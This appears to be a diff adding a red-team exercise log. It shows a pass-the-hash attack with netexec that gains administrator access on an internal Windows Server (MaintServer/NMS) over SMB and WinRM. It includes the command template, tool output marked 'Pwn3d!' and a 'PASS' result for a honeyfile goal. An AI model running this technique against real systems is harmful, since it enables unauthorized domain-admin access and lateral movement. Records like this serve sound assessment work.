@@ -1,0 +1,15 @@
+Stage-2 live proof — pass-the-hash into NMS (MaintServer) — 2026-10-20
+Source: Kali 10.5.20.50 (netexec) ; Target: MaintServer/NMS 192.168.30.11
+Credential: np.local\Administrator, authenticated by NT hash only (hash redacted below).
+Command (per protocol): nxc <smb|winrm> 192.168.30.11 -u Administrator -H <NTHASH> -d np.local
+
+===== nxc smb 192.168.30.11 (PtH as NP\Administrator) =====
+SMB   192.168.30.11  445  DMZH2MAINT  [*] Windows Server 2022 Build 20348 x64 (name:DMZH2MAINT) (domain:np.local) (signing:False) (SMBv1:None)
+SMB   192.168.30.11  445  DMZH2MAINT  [+] np.local\Administrator:<NTHASH> (Pwn3d!)
+
+===== nxc winrm 192.168.30.11 (PtH as NP\Administrator) =====
+WINRM 192.168.30.11  5985 DMZH2MAINT  [*] Windows Server 2022 Build 20348 (name:DMZH2MAINT) (domain:np.local)
+WINRM 192.168.30.11  5985 DMZH2MAINT  [+] np.local\Administrator:<NTHASH> (Pwn3d!)
+
+Result: PASS. The DA NT hash grants admin on the NMS host over both SMB and WinRM, so GP-2
+("use the stolen admin hash to reach NMS and read the honeyfile") is viable. signing:False on SMB.
